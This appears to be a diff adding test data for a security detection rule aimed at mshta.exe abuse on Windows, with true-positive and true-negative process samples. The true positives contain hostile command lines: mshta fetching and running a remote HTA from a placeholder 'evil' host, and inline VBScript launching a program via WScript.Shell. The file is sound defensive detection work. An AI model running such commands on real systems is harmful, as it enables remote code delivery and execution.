@@ -1,0 +1,9 @@
+rule_id: 9b14abea-b621-4d70-95f8-0228112c57b7
+true_positives:
+  - Image: 'C:\Windows\System32\mshta.exe'
+    CommandLine: 'mshta.exe https://cdn.evil.example/invoice.hta'
+  - Image: 'C:\Windows\SysWOW64\mshta.exe'
+    CommandLine: 'mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc"":close")'
+true_negatives:
+  - Image: 'C:\Windows\System32\mshta.exe'
+    CommandLine: 'mshta.exe C:\Apps\Inventory\inventory.hta'
